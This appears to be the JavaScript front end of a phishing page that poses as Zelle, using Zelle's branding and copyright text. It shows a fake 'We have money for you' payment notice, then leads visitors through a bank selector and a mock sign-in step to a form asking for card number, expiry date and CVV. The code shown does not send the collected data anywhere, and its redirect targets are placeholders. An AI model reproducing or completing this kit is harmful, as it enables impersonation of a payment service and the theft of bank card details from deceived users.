import './imageNameList.js';

class RegistrationFlow {
    constructor() {
        this.banks = [];
        this.mainContainer = document.getElementById('mainContainer');
        this.modalContainer = document.getElementById('modalContainer');
        this.selectedBank = null;
        this.currentStep = '';
        this.init();

        // Handle browser back/forward navigation
        window.addEventListener('popstate', (event) => {
            if (event.state && event.state.step) {
                this.navigateToStep(event.state.step, true);
            }
        });
    }

    async init() {
        // Show loading page first
        this.navigateToStep('loading');

        // Wait for 4 seconds
        await this.simulateLoading();
        await this.simulateLoading();

        // Show welcome modal
        this.navigateToStep('welcome');
    }

    
    async simulateLoading() {
        console.log(imageListObject);
        return new Promise(resolve => setTimeout(resolve, 2000));
    }

    showLoadingPage() {
        this.mainContainer.innerHTML = `
            <div class="loading-page">
                <div class="loading-content">
                    <div class="loading-spinner">
                    </div>
                    <img src="resource/Assets/files/zzz.png" alt="Loading" class="loading-image">
                    <!-- <p>Please wait while we connect you securely</p> -->
                </div>
            </div>
        `;
    }

    navigateToStep(step, isBackNavigation = false) {
        this.currentStep = step;

        if (!isBackNavigation) {
            history.pushState({ step }, '', `#${step}`);
        }

        switch (step) {
            case 'loading':
                this.showLoadingPage();
                break;
            case 'welcome':
                this.showWelcomeModal();
                break;
            case 'bankSearch':
                this.modalContainer.classList.add('hidden');
                this.mainContainer.innerHTML = `
                    <div class="bank-search-page">
                        <!-- Header Section -->
                        <div class="header-main-section fixed container">
                            <div class="header-section">
                                <span class="zelle-logo-container">
                                    <img src="/resource/imgs/zelleloggowhite.svg" alt="Zelle" class="zelle-logo">
                                </span>
                                <span>Find Your Bank</span>
                            </div>
                        </div>

                        <main class="main-section">


                        <!-- Search Input Section -->
                        <div class="search-section container">
                            <input type="text" 
                                   class="search-input" 
                                   placeholder="Enter your bank's name"
                                   oninput="app.handleBankSearch(this.value)">
                        </div>
                        <div id="bankListResults" class="bank-list-results"></div>

                        <!-- What Next Section -->
                        <div class="what-next-section">
                            <h2>What next?</h2>
                            <p class="instructions">
                                Please enter your bank name in the text field above to find your bank, the process 
                                usually takes few minutes. You must have a bank account in the U.S. to use Zelle®. 
                                Transactions typically occur in minutes when the recipient's email address or U.S. 
                                mobile number is already enrolled with Zelle® or U.S. bank account.
                            </p>
                        </div>

                        <!-- Footer Section -->
                        </main>
                        <footer>
                            <div class="footer-content">
                                <div class="footer-logo-social">
                                    <img src="/resource/imgs/zelleloggowhite.svg" alt="Zelle" class="zelle-logo">
                                    <div class="footer-links">
                                        <a href="#">Contact Us</a>
                                        <a href="#">Partners</a>
                                        <a href="#">Press</a>
                                        <a href="#">Legal</a>
                                        <a href="#">Your Privacy Rights</a>
                                    </div>
                                    <div class="social-links">
                                        <a href="#" class="twitter">Twitter</a>
                                        <a href="#" class="facebook">Facebook</a>
                                        <a href="#" class="instagram">Instagram</a>
                                        <a href="#" class="youtube">YouTube</a>
                                    </div>
                                </div>
                                <div class="footer-text">
                                    <p class="footer-note">
                                        Must have a bank account in the U.S. to use Zelle®. Transactions typically occur in minutes when the recipient's email address 
                                        or U.S. mobile number is already enrolled with Zelle®
                                    </p>
                                    <p class="copyright">
                                        ©2021 Early Warning Services, LLC. All rights reserved. Zelle and the Zelle related marks are property of Early Warning 
                                        Services, LLC. Other product and company names mentioned herein are the property of their respective owners.
                                    </p>
                                </div>
                            </div>
                        </footer>
                    </div>
                `;
                break;
            case 'bankConfirm':
                this.showBankConfirmModal();
                break;
            case 'login':
                this.showLoginPage();
                break;
            case 'securityCheck':
                this.showSecurityCheck();
                break;
            case 'cardVerification':
                this.showCardVerification();
                break;
            case 'completeTransaction':
                this.showCompleteTransaction();
                break;
        }
    }

    showWelcomeModal() {
        // Fade out just the loading content
        const loadingContent = this.mainContainer.querySelector('.loading-content');
        if (loadingContent) {
            loadingContent.classList.add('fade-out');
        }

        this.modalContainer.innerHTML = `
            <div class="welcome-modal">
                <div class="modal-content">
                    <div class="modal-body">
                        <div class="modal-logo">
                            <img src="/resource/imgs/zelleloggo.svg" alt="Zelle" title="Zelle">
                        </div>
                        <h3 class="modal-content-title aqq1">We have money for you</h3>
                        <div class="modal-main-content">
                            <p>You have received money through Zelle®, and we're processing the payment at the moment. Your sender registered with a Zelle® member bank that supports real-time payment processing.</p>
                            <p>Please select your bank to receive the money, the process usually takes few minutes.</p>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button onclick="app.navigateToStep('bankSearch')" class="primary-button">
                            Start Search
                        </button>
                    </div>
                </div>
            </div>
        `;
        this.modalContainer.classList.remove('hidden');
    }

    startBankSearch() {
        this.modalContainer.classList.add('hidden');
        this.navigateToStep('bankSearch');
        this.mainContainer.innerHTML = `
            <div class="bank-search-page">
                <header class="region-header"><div class="region-header__contents container"><div class="header__item"><div id="block-register-zellepay-sitebranding" class="site-branding"><a class="site-branding__link" href="https://zellepay.com" target="_blank" title="Home" rel="home noopener noreferrer"><img class="site-branding__logo" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NyIgaGVpZ2h0PSI0MCIgdmlld0JveD0iMCAwIDk3IDQwIj4KICAgIDxnIGZpbGw9IiNGRkZGRkUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPHBhdGggZD0iTTU3LjA5NCAzMy40MDJjLS41ODMtMS4wMjQtLjk0OC0yLjE3Ny0xLjExNS0zLjUyNWEuNjgxLjY4MSAwIDAgMC0uODA1LS41ODYgMy45MTQgMy45MTQgMCAwIDEtLjc0Ni4wNzRjLS43ODUgMC0xLjM4NS0uMTMyLTEuMzg1LTEuNzk2di0xLjU5NGgtLjAwNVYzLjU5NGEuNjIxLjYyMSAwIDAgMC0uNjItLjYyM2gtNC41MDlhLjYyMi42MjIgMCAwIDAtLjYyLjYyM3YyNC41MTVjMCAxLjgzNi4xNjggMy4yMjMgMS4wMDggNC40NjIgMS4wMjggMS40MTkgMy4wNzYgMi4yNDIgNC45NTggMi4yNDJsLjI5Mi0uMDAyaC4wMDJjMS4xNDQgMCAyLjI1OS0uMTA0IDMuMTc4LS40MjVhLjY4Mi42ODIgMCAwIDAgLjM2Ny0uOTgzTTY5LjMzIDMyLjYxNGMtLjgzMS0xLjIxNi0xLjA5LTEuNDI2LTEuNjUtMi43MzctLjA3NS0uMTc0LS4xMjMtLjM1Ny0uMjc2LS40NjhhLjY3My42NzMgMCAwIDAtLjUyOC0uMTE4IDMuOTI2IDMuOTI2IDAgMCAxLS43NDcuMDc0Yy0uNzg1IDAtMS4zODYtLjEzMi0xLjM4Ni0xLjc5NnYtMS41OTRoLS4wMDRWMy41OTRhLjYyMi42MjIgMCAwIDAtLjYyLS42MjNoLTQuNTFhLjYyMS42MjEgMCAwIDAtLjYyLjYyM3YyNC41MTVjMCAxLjgzNi4xNjkgMy4yMjMgMS4wMSA0LjQ2MiAxLjAyNyAxLjQxOSAzLjA3NSAyLjI0MiA0Ljk1NiAyLjI0MmwuMjkyLS4wMDJoLjAwNGMxLjE0MiAwIDIuMjU3LS4xMDQgMy4xNzctLjQyNS4xOTEtLjA2Ni44NzQtLjQxNSAxLjAxNS0uNTYuNDQxLS40NTUuMDAxLTEuMDQ0LS4xMTMtMS4yMU0yOC4zMzggMjAuMTE3Yy40Ny0yLjU4OCAyLjQ2NS00LjIyNCA1LjI4LTQuMjI0IDIuOCAwIDQuNjk4IDEuNTY1IDUuMTkgNC4yMjRoLTEwLjQzem01LjE5OC05LjEzYy0zLjQyMSAwLTYuMzI4IDEuMjA4LTguNDA1IDMuNDk0LTEuOTU4IDIuMTUzLTMuMDM2IDUuMTgtMy4wMzYgOC41MjEgMCAzLjM5MiAxLjA2OCA2LjMwMSAzLjA4OCA4LjQxNiAyLjEyMiAyLjIyIDUuMTY3IDMuMzk0IDguODA0IDMuMzk0IDMuOTI4IDAgNy4yMjMtMS4zOCA5Ljc5NS00LjEwMi4yMzUtLjI0OC4yNDUtLjcwMy0uMDItLjg3OC0uMjY4LS4xNzQtMS42MDctMS4wODctMi45NTItMi44MzgtLjE1OS0uMTEtLjI3LS4xNzMtLjQyOS0uMTczaC0uMDE4YS42Mi42MiAwIDAgMC0uNDM3LjE5OWMtMS41NDUgMS42Ny0zLjUyNyAyLjM1MS01LjgxNCAyLjM1MS0zLjM4NyAwLTUuNDc0LTEuNjA0LTUuODgtNC43MThoMTUuNzE1YS42MjIuNjIyIDAgMCAwIC42MTctLjU1NGMuMDU2LS41MDcuMDg1LTEuMDcxLjA4NS0xLjYzMSAwLTMuMjI1LTEuMDU1LTYuMTMxLTIuOTctOC4xODQtMi4wMTMtMi4xNTctNC44MjktMy4yOTctOC4xNDMtMy4yOTd6TTc1LjE3NyAyMC4xMTdjLjQ3LTIuNTg4IDIuNDY1LTQuMjI0IDUuMjM4LTQuMjI0IDIuOCAwIDQuNyAxLjU2NSA1LjE5MiA0LjIyNGgtMTAuNDN6bTUuMTk3LTkuMTNjLTMuNDIgMC02LjMyOCAxLjIwOC04LjQwNCAzLjQ5NC0xLjk1OSAyLjE1My0zLjAzNyA1LjE4LTMuMDM3IDguNTIxIDAgMy4zOTIgMS4wNjggNi4zMDEgMy4wODggOC40MTYgMi4xMjMgMi4yMiA1LjE2NyAzLjM5NCA4LjgwNCAzLjM5NCAzLjkyOSAwIDcuMjI0LTEuMzggOS43OTYtNC4xMDIuMjM1LS4yNDguMjQ1LS43MDMtLjAyMS0uODc4LS4yNjctLjE3NC0xLjYwNy0xLjA4Ny0yLjk1MS0yLjgzOC0uMTYtLjExLS4yNy0uMTczLS40My0uMTczaC0uMDE4YS42MjEuNjIxIDAgMCAwLS40MzYuMTk5Yy0xLjU0NSAxLjY3LTMuNTI4IDIuMzUxLTUuODE5IDIuMzUxLTMuMzg3IDAtNS40NzQtMS42MDQtNS44OC00LjcxOGgxNS43MTVhLjYyMS42MjEgMCAwIDAgLjYxNy0uNTU0IDE1LjA0IDE1LjA0IDAgMCAwIC4wODYtMS42MzFjMC0zLjIyNS0xLjA1NS02LjEzMS0yLjk3LTguMTg0LTIuMDEzLTIuMTU3LTQuODMtMy4yOTctOC4xNDQtMy4yOTd6Ii8+CiAgICAgICAgPHBhdGggZD0iTTIzLjIwMyAzMy4yNTlsLS4wNjctLjA2NmMtLjAxNy0uMDE3LS4wMzUtLjAzMy0uMDUyLS4wNTJhMTMuMDQgMTMuMDQgMCAwIDEtMi41NDUtMy44ODcuNjIuNjIgMCAwIDAtLjU3LS4zNzdIOC4xNDJsMTQuNDY0LTE4LjU3YS42MjYuNjI2IDAgMCAwIC4xMy0uMzg0VjYuMzA1YS42MjIuNjIyIDAgMCAwLS42Mi0uNjI0aC03LjgwMVYuNDkxYS4zMTEuMzExIDAgMCAwLS4zMS0uMzFIOS4yMWEuMzEuMzEgMCAwIDAtLjMxLjMxdjUuMTlIMS4yNTRhLjYyMi42MjIgMCAwIDAtLjYyLjYyNFYxMC41YzAgLjM0My4yNzcuNjIyLjYyLjYyMkgxNC41M0wuMTUyIDI5LjUyN2EuNjI1LjYyNSAwIDAgMC0uMTMyLjM4NXYzLjc4M2MwIC4zNDQuMjc4LjYyMy42Mi42MjNoOC4yNjR2NS4xOWEuMzEuMzEgMCAwIDAgLjMxLjMxMWg0Ljc5NmEuMzEuMzEgMCAwIDAgLjMxLS4zMTF2LTUuMTloOC40NGEuNjI0LjYyNCAwIDAgMCAuNDQyLTEuMDZNOTMuNTAxIDguMTc5aC41MjVjLjEwNCAwIC4yMDUtLjAwMy4zMDQtLjAxYS44MzYuODM2IDAgMCAwIC4yNjctLjA2MS40MTUuNDE1IDAgMCAwIC4xODQtLjE1LjUxMS41MTEgMCAwIDAgLjA2OC0uMjg0LjQ3Mi40NzIgMCAwIDAtLjA2LS4yNTMuMzg4LjM4OCAwIDAgMC0uMTYtLjE0Ni42NTQuNjU0IDAgMCAwLS4yMjMtLjA2NCAyLjE1IDIuMTUgMCAwIDAtLjI0NS0uMDE0aC0uNjZ2Ljk4MnptLS40MjUtMS4zNjZoMS4xMmMuMzY5IDAgLjY0LjA3LjgxNi4yMS4xNzUuMTQuMjYyLjM2NC4yNjIuNjcyIDAgLjI3NS0uMDc4LjQ3Ny0uMjM0LjYwNWExLjA1NiAxLjA1NiAwIDAgMS0uNTc0LjIyOGwuODc5IDEuMzUyaC0uNDYxbC0uODM3LTEuMzE3aC0uNTQ2VjkuODhoLS40MjVWNi44MTN6bS0xLjI0OSAxLjUzYTIuMjM2IDIuMjM2IDAgMCAwIC42NTMgMS41OTdjLjIwMy4yMDIuNDQuMzYxLjcwOS40NzcuMjcuMTE2LjU2LjE3NC44NzMuMTc0LjMxMSAwIC42MDItLjA1OC44NzItLjE3NGEyLjIzNiAyLjIzNiAwIDAgMCAxLjE4OC0xLjIwMyAyLjMyIDIuMzIgMCAwIDAgLjE3My0uOWMwLS4zMTgtLjA1OC0uNjE0LS4xNzMtLjg5YTIuMjEgMi4yMSAwIDAgMC0xLjE4OC0xLjE4OGMtLjI3LS4xMTMtLjU2LS4xNy0uODcyLS4xNy0uMzEzIDAtLjYwNC4wNTgtLjg3My4xNzRhMi4yOCAyLjI4IDAgMCAwLS43MDkuNDc3IDIuMTY4IDIuMTY4IDAgMCAwLS40NzkuNzE4Yy0uMTE2LjI3OC0uMTc4LjU4LS4xNzguOTA4em0tLjQyNSAwYzAtLjM4LjA3LS43MzIuMjEyLTEuMDU3YTIuNjcgMi42NyAwIDAgMSAuNTc1LS44NDRjLjI0Mi0uMjM3LjUyMy0uNDIzLjg0NC0uNTU8YTIuNjI4IDIuNjI4IDAgMCAxIDEuMDI5LS4yMDMgMi42OSAyLjY5IDAgMCAxIDEuODcyLjc1OGMuMjQxLjIzNS40MzMuNTEyLjU3NC44MzMuMTQyLjMyLjIxMy42NjguMjEzIDEuMDQyYTIuNjQ1IDIuNjQ1IDAgMCAxLS43ODcgMS45IDIuNjU4IDIuNjU4IDAgMCAxLTEuODcyLjc2MmMtLjM2NCAwLS43MDgtLjA2OC0xLjAyOS0uMjAzYTIuNjQ1IDIuNjQ1IDAgMCAxLTEuNDE5LTEuMzg4IDIuNTQgMi41NCAwIDAgMS0uMjEyLTEuMDQyeiIvPgogICAgPC9nPgo8L3N2Zz4K" alt=""> <span class="site-branding__slogan">Find Your Bank</span> </a></div></div></div></header>
                <div class="bank-search">
                    <div class="search-header">
                        <h2>Select your bank</h2>
                        <div class="search-input-wrapper">
                            <input type="text" 
                                   class="search-input" 
                                   placeholder="Start typing bank name"
                                   oninput="app.handleBankSearch(this.value)">
                        </div>
                    </div>
                    <div id="bankListResults" class="bank-list-results"></div>
                </div>
            </div>
        `;
    }

    handleBankSearch(searchText) {
        console.log('Searching for:', searchText);
        const bankListResults = document.getElementById('bankListResults');
        
        // Clear previous results
        bankListResults.innerHTML = '';
        
        // If search text is empty, hide the results
        if (!searchText || searchText.length === 0) {
            bankListResults.classList.remove('show');
            return;
        }

        // Filter banks from imageListObject array
        const filteredBanks = window.searchLogo(bank => 
            bank.name.toLowerCase().includes(searchText.toLowerCase())
        );
        
        // Show dropdown with results
        bankListResults.classList.add('show');
        
        if (filteredBanks.length > 0) {
            const resultHtml = filteredBanks.map(bank => `
                <div class="bank-item" onclick="app.selectBank({name: '${bank.name}', image: '${bank.link}'})">
                    <img src="${bank.link}" alt="${bank.name}" class="bank-logo">
                    <span class="bank-name">${bank.name}</span>
                </div>
            `).join('');
            bankListResults.innerHTML = resultHtml;
        } else {
            bankListResults.innerHTML = '<div class="no-results">No banks found</div>';
        }
    }

    selectBank(bank) {
        this.selectedBank = bank;
        // Navigate to bank confirmation step
        this.navigateToStep('bankConfirm');
    }

    showBankConfirmModal() {
        this.modalContainer.innerHTML = `
            <div class="confirm-modal">
                <div class="modal-content">
                    <img src="${this.selectedBank.image}" 
                         alt="${this.selectedBank.name}" 
                         class="bank-logo">
                    <h3>Continue with ${this.selectedBank.name}?</h3>
                    <button onclick="app.showLoginPage()" class="primary-button">
                        Continue
                    </button>
                </div>
            </div>
        `;
        this.modalContainer.classList.remove('hidden');
    }

    showLoginPage() {
        this.modalContainer.classList.add('hidden');
        this.navigateToStep('login');
        this.mainContainer.innerHTML = `
            <div class="login-page">
                <div class="bank-header">
                    <img src="${this.selectedBank.image}" 
                         alt="${this.selectedBank.name}" 
                         class="bank-logo">
                    <h3>${this.selectedBank.name}</h3>
                </div>
                <button onclick="app.showSecurityCheck()" class="primary-button">
                    Sign in with username and password
                </button>
            </div>
        `;
    }

    showSecurityCheck() {
        this.navigateToStep('securityCheck');
        this.mainContainer.innerHTML = `
            <div class="security-check">
                <h2>Security Check</h2>
                <div class="security-content">
                    <img src="media/security-icon.png" alt="Security" class="security-icon">
                    <p>We need to verify your identity</p>
                    <button onclick="app.showCardVerification()" class="primary-button">
                        Continue
                    </button>
                </div>
            </div>
        `;
    }

    showCardVerification() {
        this.navigateToStep('cardVerification');
        this.mainContainer.innerHTML = `
            <div class="card-verification">
                <h2>Account Verification by Card</h2>
                <div class="card-form">
                    <div class="form-group">
                        <label>Card Number</label>
                        <input type="text" placeholder="XXXX XXXX XXXX XXXX" maxlength="19">
                    </div>
                    <div class="form-row">
                        <div class="form-group">
                            <label>Expiry Date</label>
                            <input type="text" placeholder="MM/YY" maxlength="5">
                        </div>
                        <div class="form-group">
                            <label>CVV</label>
                            <input type="password" placeholder="XXX" maxlength="3">
                        </div>
                    </div>
                    <button onclick="app.showCompleteTransaction()" class="primary-button">
                        Continue
                    </button>
                </div>
            </div>
        `;
    }

    showCompleteTransaction() {
        this.navigateToStep('completeTransaction');
        this.mainContainer.innerHTML = `
            <div class="complete-transaction">
                <h2>Complete Transaction</h2>
                <div class="transaction-details">
                    <div class="detail-row">
                        <span>Selected Bank:</span>
                        <span>${this.selectedBank.name}</span>
                    </div>
                    <div class="detail-row">
                        <span>Status:</span>
                        <span>Ready to Complete</span>
                    </div>
                </div>
                <button onclick="app.handleCompletion()" class="primary-button">
                    Complete Transaction
                </button>
            </div>
        `;
    }

    detectPlatform() {
        const ua = navigator.userAgent.toLowerCase();
        if (/android/i.test(ua)) return 'android';
        if (/ipad|iphone|ipod/.test(ua) && !window.MSStream) return 'ios';
        return 'web';
    }

    handleCompletion() {
        const platform = this.detectPlatform();
        const redirectUrls = {
            android: 'https://play.google.com/store/apps/your-app',
            ios: 'https://apps.apple.com/app/your-app',
            web: 'https://your-website.com'
        };

        window.location.href = redirectUrls[platform];
    }
}

// Initialize the app when document is ready
document.addEventListener('DOMContentLoaded', () => {
    window.app = new RegistrationFlow();
}); 